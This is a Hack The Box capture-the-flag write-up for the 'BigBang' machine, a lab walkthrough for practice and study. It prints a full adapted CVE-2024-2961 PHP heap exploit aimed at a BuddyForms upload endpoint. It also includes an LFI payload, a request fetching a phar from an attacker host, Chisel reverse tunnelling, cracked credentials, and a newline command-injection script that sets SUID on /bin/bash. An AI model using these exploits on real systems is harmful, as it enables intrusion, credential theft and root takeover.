---
title: BigBang - Hack The Box Writeup
date: 2025-01-31
categories: [CTF, Writeups]
tags: [htb, linux, rce, lfi, wordpress, privilege-escalation]
description: A detailed walkthrough of the BigBang HTB machine, uncovering vulnerabilities in WordPress, exploiting RCE, and achieving root access.
author: l4tmur
---

## Introduction

Hi all, it's been a long time since I wrote blogs! I just pwned a machine from HTB named **BigBang**, authored by @ruycraft & @lavclash75.

- **Machine Name:** BigBang  
- **OS:** Linux  
- **Difficulty:** Hard  

Let's start the walkthrough!

---

## Initial Reconnaissance

### Nmap Scan

Started with an Nmap scan:

```sh
nmap -sC -sV -Pn 10.10.11.52 
```

Ports 22 & 80 are open! While browsing the webpage, it showed **blog.bigbang.htb**.

Let's add it to our hosts file:

```sh
echo "10.10.11.52 blog.bigbang.htb" | sudo tee -a /etc/hosts
echo "10.10.11.52 bigbang.htb" | sudo tee -a /etc/hosts
```

It's a WordPress site, time to run **wpscan**:

```sh
wpscan --url http://blog.bigbang.htb/ -e ap --api-token <YOUR_WPSCAN_API_TOKEN>
```

While analyzing the page, I found an **upload functionality** and **directory listing enabled**.

Additionally, **XML-RPC** was enabled, but brute-forcing login credentials didn't work.

---

## Exploiting CVE-2023-26326

The **BuddyForms** plugin was loading first when intercepting requests with Burp Suite. A critical vulnerability, **CVE-2023-26326**, exists in this plugin that allows **unauthenticated insecure deserialization**, potentially leading to **Remote Code Execution (RCE)**.

Reference: [Tenable Blog](https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8)

### Vulnerable Code Analysis

```php
function buddyforms_upload_image_from_url() {
  $url            = isset( $_REQUEST['url'] ) ? wp_kses_post( wp_unslash( $_REQUEST['url'] ) ) : '';
  $file_id        = isset( $_REQUEST['id'] ) ? sanitize_text_field( wp_unslash( $_REQUEST['id'] ) ) : '';
  $accepted_files = isset( $_REQUEST['accepted_files'] ) ? explode( ',', buddyforms_sanitize( '', wp_unslash( $_REQUEST['accepted_files'] ) ) ) : array( 'jpeg' );

  if ( ! empty( $url ) && ! empty( $file_id ) ) {
    $upload_dir             = wp_upload_dir();
    $image_url              = urldecode( $url );
    $image_data             = file_get_contents( $image_url ); // Get image data
    $image_data_information = getimagesize( $image_url );
    $image_mime_information = $image_data_information['mime'];

    if ( ! in_array( $image_mime_information, $accepted_files ) ) {
      echo wp_json_encode(
        array(
          'status'   => 'FAILED',
          'response' => __('File type ' . $image_mime_information . ' is not allowed.', 'buddyforms')
        )
      );
      die();
    }
  }
}
```

### Exploitation Attempt

From the analysis, the function allows arbitrary URLs, meaning an attacker can provide a crafted **phar://** URL pointing to a malicious archive.

Tried the following exploit:

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: blog.bigbang.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json
Content-Type: application/x-www-form-urlencoded
Content-Length: 97
Connection: keep-alive
Referer: http://blog.bigbang.htb/

action=upload_image_from_url&url=http://x.x.x.x/evil.phar&id=420&accepted_files=image/gif
```

However, this threw an error: `File type not allowed`.

Upon reviewing the code, I found that the issue occurs due to:

- `getimagesize()` extracting the MIME type, which fails when using **phar://**.
- The required **gadget chain** from a dummy plugin was missing.

The error seems to be triggered by an empty `image_mime_information`, resulting in the message **"file type is not allowed"** with unexpected spacing.

The MIME type is extracted using `getimagesize()`, which appears to be the weak point. Additionally, the required gadget chain from the dummy plugin is missing, as referenced in the blog.

To bypass this, I referenced the blog post on [CVE-2024-2961 - PHP Iconv Exploitation](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1).

PoC Exploit: [GitHub - Ambionics Exploits](https://github.com/ambionics/cnext-exploits)

A **PHP filter chain** is used to prepend the filename we specify to the uploaded PNG file, enabling RCE.

When uploading:

```
![](/assets/images/Pasted%20image%2020250131000038.png)
```

---

## Local File Inclusion (LFI) Exploit

I used the following payload to exploit LFI:

```php
php://filter/convert.base64-encode|convert.base64-decode/resource=/etc/passwd
```

```
![](/assets/images/Pasted%20image%2020250131000334.png)
```

When accessing the PNG file, it revealed the contents of `/etc/passwd`. **Whoayy! We got LFI!**

I automated the enumeration of user credentials using a Python script.

Next, I attempted to access config files to retrieve user credentials, but initial attempts were unsuccessful.

I tried accessing the default path:

```
/var/www/html/wordpress/wp-config.php
```

```
![](/assets/images/Pasted%20image%2020250131012239.png)
```

The MySQL database was running locally on **172.17.0.1**. Even brute-forcing the WordPress configuration didn't yield credentials.

**Need to find a way to trigger a shell...**

---

## Getting Shell as WWW-Data

If we just go through that blog, in short, I will explain what they mentioned:

- **File Read Primitive**

    - The exploit abuses `php://filter/` to **read arbitrary files** on the system.
    - It first reads **/proc/self/maps** to locate **where important memory regions are** (like heap, libc).

- **Memory Manipulation**

    - It searches for **the heap structure in PHP’s memory** (`zend_mm_heap`).
    - The goal is to **modify the heap’s free list**, which tracks freed memory chunks.

- **Heap Corruption with Encoding Tricks**

    - The exploit **uses multiple encoding filters** (like `iconv`, `base64`) to shape data in a way that lets it **overwrite memory pointers**.
    - This step carefully manipulates how PHP **allocates and frees memory**, allowing the attacker to take control.

- **Remote Code Execution (RCE)**

    - Finally, the attacker **injects a malicious command** into memory.
    - PHP **executes this injected command**, giving control over the system.

To Know more about the Exploit Dev Refer this [CVE-2024-2961 - PHP Iconv Exploitation](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1).

They also provided exploits for this, and we just modified them accordingly for our case. Here is the customized exploit I used: 

```python
#!/usr/bin/env python3
#
# CNEXT: PHP file-read to RCE (CVE-2024-2961)
# Date: 2024-05-27
# Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)
#
# TODO Parse LIBC to know if patched
#
# INFORMATIONS
#
# To use, implement the Remote class, which tells the exploit how to send the payload.
#

from __future__ import annotations

import base64
import urllib.parse
import zlib
import urllib

from dataclasses import dataclass
from requests.exceptions import ConnectionError, ChunkedEncodingError

from pwn import *
from ten import *


HEAP_SIZE = 2 * 1024 * 1024
BUG = "劄".encode("utf-8")


class Remote:
    """A helper class to send the payload and download files.
    
    The logic of the exploit is always the same, but the exploit needs to know how to
    download files (/proc/self/maps and libc) and how to send the payload.
    
    The code here serves as an example that attacks a page that looks like:
    
    ```php
    <?php
    
    $data = file_get_contents($_POST['file']);
    echo "File contents: $data";
    ```
    
    Tweak it to fit your target, and start the exploit.
    """

    def __init__(self, url: str) -> None:
        self.url = url
        self.session = Session()

    def send(self, path: str) -> Response:
        """Sends given `path` to the HTTP server. Returns the response.
        """

        data = {'action' : 'upload_image_from_url',
                'url' : urllib.parse.quote_plus('php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource='+path),
                'id' : '1',
                'accepted_files' : 'image/gif'}
        return self.session.post(self.url, data=data)


    def send_exploit(self, payload: bytes) -> Response:
        """Sends the payload to the server.
        """
        data = {'action' : 'upload_image_from_url',
                'url' : urllib.parse.quote_plus(payload),
                'id' : '1',
                'accepted_files' : 'image/gif'}
        return self.session.post(self.url, data=data)
        
    def download(self, path: str) -> bytes:
        """Returns the contents of a remote file.
        """
        path = f"php://filter/convert.base64-encode/resource={path}"
        file_path = self.send(path).json()['response']
        
        if 'File type' in file_path:
            print(file_path)
            return b''
        
        response = self.session.get(file_path)
        data = response.content[6:]
        return data

    def data_decode(self, data:bytes)->bytes:
        data = data.decode('latin-1')
        return base64.decode(data + (4 - len(data) % 4) * '=')

@entry
@arg("url", "Target URL")
@arg("command", "Command to run on the system; limited to 0x140 bytes")
@arg("sleep", "Time to sleep to assert that the exploit worked. By default, 1.")
@arg("heap", "Address of the main zend_mm_heap structure.")
@arg(
    "pad",
    "Number of 0x100 chunks to pad with. If the website makes a lot of heap "
    "operations with this size, increase this. Defaults to 20.",
)
@dataclass
class Exploit:
    """CNEXT exploit: RCE using a file read primitive in PHP."""

    url: str
    command: str
    sleep: int = 1
    heap: str = None
    pad: int = 20

    def __post_init__(self):
        self.remote = Remote(self.url)
        self.log = logger("EXPLOIT")
        self.info = {}
        self.heap = self.heap and int(self.heap, 16)

    def check_vulnerable(self) -> None:
        """Checks whether the target is reachable and properly allows for the various
        wrappers and filters that the exploit needs.
        """
        
        def safe_download(path: str) -> bytes:
            try:
                return self.remote.download(path)
            except ConnectionError:
                failure("Target not [b]reachable[/] ?")
            

        def check_token(text: str, path: str) -> bool:
            result = safe_download(path)

            return len(set(result).intersection(set(text.encode()))) > 0

        text = tf.random.string(50).encode()
        base64 = b64(b'GIF89a' + text, misalign=True).decode()
        path = f"data:text/plain;base64,{base64}"
        
        result = safe_download(path)
        
        if len(set(result).intersection(set(text))) == 0:
            msg_failure("Remote.download did not return the test string")
            print("--------------------")
            print(f"Expected test string: {text}")
            print(f"Got: {result}")
            print("--------------------")
            failure("If your code works fine, it means that the [i]data://[/] wrapper does not work")

        msg_info("The [i]data://[/] wrapper works")

        text = 'GIF89a' + tf.random.string(50)
        base64 = b64(text.encode(), misalign=True).decode()
        path = f"php://filter//resource=data:text/plain;base64,{base64}"
        if not check_token(text, path):
            failure("The [i]php://filter/[/] wrapper does not work")

        msg_info("The [i]php://filter/[/] wrapper works")

        text = 'GIF89a' + tf.random.string(50)
        base64 = b64(compress(text.encode()), misalign=True).decode()
        path = f"php://filter/zlib.inflate/resource=data:text/plain;base64,{base64}"

        if not check_token(text, path):
            failure("The [i]zlib[/] extension is not enabled")

        msg_info("The [i]zlib[/] extension is enabled")

        msg_success("Exploit preconditions are satisfied")

    def get_file(self, path: str) -> bytes:
        with msg_status(f"Downloading [i]{path}[/]..."):
            return self.remote.download(path)

    def get_regions(self) -> list[Region]:
        """Obtains the memory regions of the PHP process by querying /proc/self/maps."""
        maps = self.remote.data_decode(self.get_file("/proc/self/maps"))
        
        PATTERN = re.compile(
            r"^([a-f0-9]+)-([a-f0-9]+)\b" r".*" r"\s([-rwx]{3}[ps])\s" r"(.*)"
        )
        regions = []
        for region in table.split(maps, strip=True):
            if match := PATTERN.match(region):
                start = int(match.group(1), 16)
                stop = int(match.group(2), 16)
                permissions = match.group(3)
                path = match.group(4)
                if "/" in path or "[" in path:
                    path = path.rsplit(" ", 1)[-1]
                else:
                    path = ""
                current = Region(start, stop, permissions, path)
                regions.append(current)
            else:
                failure("Unable to parse memory mappings")

        self.log.info(f"Got {len(regions)} memory regions")

        return regions

    def get_symbols_and_addresses(self) -> None:
        """Obtains useful symbols and addresses from the file read primitive."""
        regions = self.get_regions()

        LIBC_FILE = "./libc.so.6"

        # PHP's heap

        self.info["heap"] = self.heap or self.find_main_heap(regions)
        print(f'HEAP address: {hex(self.info["heap"])}')

        # Libc

        libc = self._get_region(regions, "libc-", "libc.so")

        #self.download_file(libc.path, LIBC_FILE)

        self.info["libc"] = ELF(LIBC_FILE, checksec=False)
        print(f'LIBC address: {hex(libc.start)}')
        self.info["libc"].address = libc.start

    def _get_region(self, regions: list[Region], *names: str) -> Region:
        """Returns the first region whose name matches one of the given names."""
        for region in regions:
            if any(name in region.path for name in names):
                break
        else:
            failure("Unable to locate region")

        return region

    def download_file(self, remote_path: str, local_path: str) -> None:
        """Downloads `remote_path` to `local_path`"""
        data = self.remote.data_decode(self.get_file(remote_path))
        Path(local_path).write(data)

    def find_main_heap(self, regions: list[Region]) -> Region:
        # Any anonymous RW region with a size superior to the base heap size is a
        # candidate. The heap is at the bottom of the region.
        heaps = [
            region.stop - HEAP_SIZE + 0x40
            for region in reversed(regions)
            if region.permissions == "rw-p"
            and region.size >= HEAP_SIZE
            and region.stop & (HEAP_SIZE-1) == 0
            and region.path in ("", "[anon:zend_alloc]")
        ]

        if not heaps:
            failure("Unable to find PHP's main heap in memory")

        first = heaps[0]

        if len(heaps) > 1:
            heaps = ", ".join(map(hex, heaps))
            msg_info(f"Potential heaps: [i]{heaps}[/] (using last one)")
        else:
            msg_info(f"Using [i]{hex(first)}[/] as heap")

        return first

    def run(self) -> None:
        #self.check_vulnerable()
        self.get_symbols_and_addresses()
        self.exploit()

    def build_exploit_path(self) -> str:
        """On each step of the exploit, a filter will process each chunk one after the
        other. Processing generally involves making some kind of operation either
        on the chunk or in a destination chunk of the same size. Each operation is
        applied on every single chunk; you cannot make PHP apply iconv on the first 10
        chunks and leave the rest in place. That's where the difficulties come from.

        Keep in mind that we know the address of the main heap, and the libraries.
        ASLR/PIE do not matter here.

        The idea is to use the bug to make the freelist for chunks of size 0x100 point
        lower. For instance, we have the following free list:

        ... -> 0x7fffAABBCC900 -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB00

        By triggering the bug from chunk ..900, we get:

        ... -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB48 -> ???

        That's step 3.

        Now, in order to control the free list, and make it point whereever we want,
        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,
        we'd have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.
        That's step 2.

        Now, if we were to perform step2 an then step3 without anything else, we'd have
        a problem: after step2 has been processed, the free list goes bottom-up, like:

        0x7fffAABBCCB00 -> 0x7fffAABBCCA00 -> 0x7fffAABBCC900

        We need to go the other way around. That's why we have step 1: it just allocates
        chunks. When they get freed, they reverse the free list. Now step2 allocates in
        reverse order, and therefore after step2, chunks are in the correct order.

        Another problem comes up.

        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.
        Since step2 creates chunks that contain pointers and pointers are generally not
        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.
        To avoid this, we put the chunks in step2 at the very end of the chain, and
        prefix them with `0\n`. When dechunked (right before the iconv), they will
        "disappear" from the chain, preserving them from the character set conversion
        and saving us from an unwanted processing error that would stop the processing
        chain.

        After step3 we have a corrupted freelist with an arbitrary pointer into it. We
        don't know the precise layout of the heap, but we know that at the top of the
        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.
        Its free_slot[] array contains a pointer to each free list. By overwriting it,
        we can make PHP allocate chunks whereever we want. In addition, its custom_heap
        field contains pointers to hook functions for emalloc, efree, and erealloc
        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and
        then overwrite the use_custom_heap flag to make PHP use these function pointers
        instead. We can now do our favorite CTF technique and get a call to
        system(<chunk>).
        We make sure that the "system" command kills the current process to avoid other
        system() calls with random chunk data, leading to undefined behaviour.

        The pad blocks just "pad" our allocations so that even if the heap of the
        process is in a random state, we still get contiguous, in order chunks for our
        exploit.

        Therefore, the whole process described here CANNOT crash. Everything falls
        perfectly in place, and nothing can get in the middle of our allocations.
        """

        LIBC = self.info["libc"]
        ADDR_EMALLOC = LIBC.symbols["__libc_malloc"]
        ADDR_EFREE = LIBC.symbols["__libc_system"]
        ADDR_EREALLOC = LIBC.symbols["__libc_realloc"]

        ADDR_HEAP = self.info["heap"]
        ADDR_FREE_SLOT = ADDR_HEAP + 0x20
        ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168

        ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10

        CS = 0x100

        # Pad needs to stay at size 0x100 at every step
        pad_size = CS - 0x18
        pad = b"\x00" * pad_size
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = compressed_bucket(pad)

        step1_size = 1
        step1 = b"\x00" * step1_size
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1, CS)
        step1 = compressed_bucket(step1)

        # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
        # ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk "crash"

        step2_size = 0x48
        step2 = b"\x00" * (step2_size + 8)
        step2 = chunked_chunk(step2, CS)
        step2 = chunked_chunk(step2)
        step2 = compressed_bucket(step2)

        step2_write_ptr = b"0\n".ljust(step2_size, b"\x00") + p64(ADDR_FAKE_BIN)
        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
        step2_write_ptr = chunked_chunk(step2_write_ptr)
        step2_write_ptr = compressed_bucket(step2_write_ptr)

        step3_size = CS

        step3 = b"\x00" * step3_size
        assert len(step3) == CS
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = compressed_bucket(step3)

        step3_overflow = b"\x00" * (step3_size - len(BUG)) + BUG
        assert len(step3_overflow) == CS
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = compressed_bucket(step3_overflow)

        step4_size = CS
        step4 = b"=00" + b"\x00" * (step4_size - 1)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = compressed_bucket(step4)

        # This chunk will eventually overwrite mm_heap->free_slot
        # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
        step4_pwn = ptr_bucket(
            0x200000,
            0,
            # free_slot
            0,
            0,
            ADDR_CUSTOM_HEAP,  # 0x18
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            ADDR_HEAP,  # 0x140
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            size=CS,
        )

        step4_custom_heap = ptr_bucket(
            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
        )

        step4_use_custom_heap_size = 0x140

        COMMAND = self.command
        COMMAND = f"kill -9 $PPID; {COMMAND}"
        if self.sleep:
            COMMAND = f"sleep {self.sleep}; {COMMAND}"
        COMMAND = COMMAND.encode() + b"\x00"

        assert (
            len(COMMAND) <= step4_use_custom_heap_size
        ), f"Command too big ({len(COMMAND)}), it must be strictly inferior to {hex(step4_use_custom_heap_size)}"
        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b"\x00")

        step4_use_custom_heap = COMMAND
        step4_use_custom_heap = qpe(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)

        pages = (
            step4 * 3
            + step4_pwn
            + step4_custom_heap
            + step4_use_custom_heap
            + step3_overflow
            + pad * self.pad
            + step1 * 3
            + step2_write_ptr
            + step2 * 2
        )

        resource = compress(compress(pages))
        resource = b64(resource) #b64(pages) 
        resource = f"data:text/plain;base64,{resource.decode()}"

        filters = [
            # Create buckets
            "zlib.inflate",
            "zlib.inflate",
            
            # Step 0: Setup heap
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 1: Reverse FL order
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 2: Put fake pointer and make FL order back to normal
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 3: Trigger overflow
            "dechunk",
            "convert.iconv.UTF-8.ISO-2022-CN-EXT",
            
            # Step 4: Allocate at arbitrary address and change zend_mm_heap
            "convert.quoted-printable-decode",
            "convert.iconv.L1.L1",
        ]
        filters = "|".join(filters)
        path = f"php://filter/read={filters}/resource={resource}"

        return path

    @inform("Triggering...")
    def exploit(self) -> None:
        path = self.build_exploit_path()
        start = time.time()

        try:
            msg_print("Sending exploit...")
            print(f'PATH: {path}')

            self.remote.send_exploit(path)
        except (ConnectionError, ChunkedEncodingError):
            pass
        
        msg_print()
        
        if not self.sleep:
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]")
        elif start + self.sleep <= time.time():
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]")
        else:
            # Wrong heap, maybe? If the exploited suggested others, use them!
            msg_print("    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]")
        
        msg_print()


def compress(data) -> bytes:
    """Returns data suitable for `zlib.inflate`.
    """
    # Remove 2-byte header and 4-byte checksum
    return zlib.compress(data, 9)[2:-4]


def b64(data: bytes, misalign=True) -> bytes:
    payload = base64.encode(data)
    if not misalign and payload.endswith("="):
        raise ValueError(f"Misaligned: {data}")
    return payload.encode()


def compressed_bucket(data: bytes) -> bytes:
    """Returns a chunk of size 0x8000 that, when dechunked, returns the data."""
    return chunked_chunk(data, 0x8000)


def qpe(data: bytes) -> bytes:
    """Emulates quoted-printable-encode.
    """
    return "".join(f"={x:02x}" for x in data).upper().encode()


def ptr_bucket(*ptrs, size=None) -> bytes:
    """Creates a 0x8000 chunk that reveals pointers after every step has been ran."""
    if size is not None:
        assert len(ptrs) * 8 == size
    bucket = b"".join(map(p64, ptrs))
    bucket = qpe(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = compressed_bucket(bucket)

    return bucket


def chunked_chunk(data: bytes, size: int = None) -> bytes:
    """Constructs a chunked representation of the given chunk. If size is given, the
    chunked representation has size `size`.
    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.
    """
    # The caller does not care about the size: let's just add 8, which is more than
    # enough
    if size is None:
        size = len(data) + 8
    keep = len(data) + len(b"\n\n")
    size = f"{len(data):x}".rjust(size - keep, "0")
    return size.encode() + b"\n" + data + b"\n"


@dataclass
class Region:
    """A memory region."""

    start: int
    stop: int
    permissions: str
    path: str

    @property
    def size(self) -> int:
        return self.stop - self.start


Exploit()

```

# BigBang CTF Walkthrough

## Getting a Shell

![/assets/images/Pasted%20image%2020250131020128.png]

Once we got the shell, we already know what to do. Let's perform some port forwarding to gain access to the MySQL database and retrieve user credentials.

### Port Forwarding MySQL DB

The IP is `172.17.0.1`, and the port is `3306`.

We can use **Chisel** to achieve this. In our attack box:

```bash
/chisel server -p 5678 --reverse
```

In the victim server:

```bash
./chisel client 10.10.14.91:5678 R:3306:172.17.0.1:3306
```

![/assets/images/Pasted%20image%2020250131020833.png]

Now we can access the MySQL database from our local machine:

```bash
mysql -D 'wordpress' -u 'wp_user' -h 172.17.0.1 --skip-ssl -p
```

![/assets/images/Pasted%20image%2020250131021020.png]

---

## Cracking the User Hash

We found a new user: **Shawking**. Let's copy the hash and try to crack it.

```bash
hashcat -m 400 shaw-hash.txt /usr/share/wordlists/rockyou.txt
```

The hash is cracked:

```
shawking:quantumphysics
```

![/assets/images/Pasted%20image%2020250131031749.png]

We got the user flag!

---

## Using LinPEAS

Next, let's run **LinPEAS** to check for further vulnerabilities. We found a **Grafana DB** with some hashes.

![/assets/images/Pasted%20image%2020250131023937.png]

![/assets/images/Pasted%20image%2020250131024852.png]

---

## Cracking Another Hash

We found another hash to crack:

```bash
hashcat -m 10900 developer-hash.txt /usr/share/wordlists/rockyou.txt
```

![/assets/images/Pasted%20image%2020250131025319.png]

---

## Checking Services

Let's check what services are running on the victim machine:

```bash
netstat -tulpn
```

![/assets/images/Pasted%20image%2020250131025710.png]

---

## Exploring the APK File

We managed to obtain an APK file.

![/assets/images/Pasted%20image%2020250131025653.png]

Opening it in **JADX-GUI**, we found a couple of interesting endpoints:

![/assets/images/Pasted%20image%2020250131025810.png]

    http://127.0.0.1:9090/login
    http://127.0.0.1:9090/command

---

## Vulnerability: OS Command Injection

Looking at the code, the `/command` endpoint is vulnerable to OS command injection. Here's a breakdown of how the vulnerability works.

The endpoint accepts JSON data like this:

```json
{
    "command": "send_image",
    "output_file": "test.jpg"
}
```

At first glance, it seems like the API just saves a file. However, after examining the decompiled code, we found the following:

```java
HttpURLConnection httpURLConnection = (HttpURLConnection) new URL("http://app.bigbang.htb:9090/command").openConnection();
httpURLConnection.setRequestMethod("POST");
httpURLConnection.setRequestProperty("Content-Type", "application/json");
httpURLConnection.setRequestProperty("Authorization", "Bearer " + this.f3740b.f2035p);
httpURLConnection.setDoOutput(true);
String str = "{\"command\": \"send_image\", \"output_file\": \"" + this.f3739a + "\"}";
```

This code shows that the server directly processes the `output_file` variable, which could lead to command injection if not properly sanitized.

---

## Exploiting the Vulnerability

We need to retrieve the authorization token and send the data to the `/command` endpoint along with the token.

### Retrieving the Token

![/assets/images/Pasted%20image%2020250131030329.png]

We retrieve the token as follows:

![/assets/images/Pasted%20image%2020250131030625.png]

### Testing the Vulnerability

Testing the vulnerability with the following payloads:

- When I tried `";"`:

![/assets/images/Pasted%20image%2020250131031359.png]

- When I tried `"\n"`, it worked:

![/assets/images/Pasted%20image%2020250131031305.png]

---

## Root Access

It's time to get root!

![/assets/images/Pasted%20image%2020250131031616.png]

---

## Exploit Script

Here’s the script that I used to exploit the OS command injection vulnerability and gain root access. You can use it too.

```python
import requests as s
import json

# Login to get the JWT token
r = s.post("http://127.0.0.1:9090/login", json={
    "username": "developer",
    "password": "bigbang"
})
print(r.text)

token = r.json()["access_token"]

# Exploit command injection to set SUID on /bin/bash
r = s.post("http://127.0.0.1:9090/command", headers={
    "Authorization": "Bearer " + token
}, json={
    "command": "send_image",
    "output_file": "\nchmod 4777 /bin/bash"
})
print(r.text)
```

With this, we’ve successfully gained root access on the victim machine.

---





